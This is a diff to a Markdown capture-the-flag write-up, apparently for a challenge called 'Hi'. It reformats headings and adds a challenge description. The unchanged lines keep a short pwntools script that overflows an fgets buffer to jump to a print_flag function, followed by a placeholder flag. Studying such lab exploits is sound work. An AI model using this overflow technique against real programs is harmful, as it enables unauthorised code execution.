@@ -1,4 +1,8 @@
-# Solution
+# Hi
+### 📄 Description
+Can you retrieve the flag?
+
+## 🔑 Solution
 It's the same as the previous exercise, it uses `fgets` instead of gets but the provided character limit is incorrect (it should be 32).
 
 ```python
@@ -11,7 +15,7 @@ p.sendline(b"A" * 32 + b"a" * 8 + p64(context.binary.functions["print_flag"].add
 log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
 ```
 
-## Flag
+### 🚩 Flag
 ```plain
 ccit{hi_i_am_a_flag}
 ```
